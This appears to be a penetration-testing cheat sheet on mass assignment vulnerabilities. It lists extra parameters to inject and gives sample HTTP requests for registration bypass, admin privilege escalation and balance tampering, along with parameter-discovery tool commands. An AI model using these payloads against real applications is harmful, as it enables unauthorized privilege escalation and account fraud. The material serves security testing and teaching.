# Mass Assignment Vulnerabilities

## Overview

Mass assignment occurs when applications automatically bind HTTP parameters to model attributes without proper filtering.

---

## Identify

### Signs of Vulnerability

- Framework uses auto-binding (Rails, Django, Node.js, etc.)
- Hidden parameters in forms
- API accepts extra fields in JSON/POST data
- Registration or profile update forms

### Test Method

1. Intercept normal request
2. Add extra parameters:
   - `admin=true`
   - `role=admin`
   - `confirmed=1`
   - `verified=1`
   - `is_staff=true`
   - `active=1`

---

## Exploit

### Registration Bypass

```http
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=hacker&password=test&confirmed=true
```

### Admin Privilege Escalation

```http
POST /api/users HTTP/1.1
Content-Type: application/json

{"username":"hacker","email":"hacker@test.com","role":"admin"}
```

### Profile Update

```http
PUT /api/profile HTTP/1.1
Content-Type: application/json

{"name":"hacker","is_admin":true,"balance":999999}
```

---

## Framework-Specific Parameters

### Ruby on Rails

```
admin
role
is_admin
confirmed_at
```

### Django

```
is_staff
is_superuser
is_active
```

### Node.js/Express

```
role
admin
verified
```

---

## Finding Hidden Parameters

### Source Code Review

```bash
# Look for model definitions
grep -r "attr_accessible" .
grep -r "permit(" .
grep -r "fields =" .
```

### Parameter Discovery Tools

```bash
# Arjun - HTTP parameter discovery
arjun -u http://TARGET/api/endpoint

# ParamSpider
python3 paramspider.py --domain TARGET
```

---

## Common Vulnerable Endpoints

| Endpoint | Test Parameters |
|----------|-----------------|
| `/register` | `admin`, `role`, `confirmed` |
| `/profile` | `is_admin`, `balance`, `role` |
| `/api/users` | `role`, `permissions` |
| `/settings` | `is_premium`, `verified` |
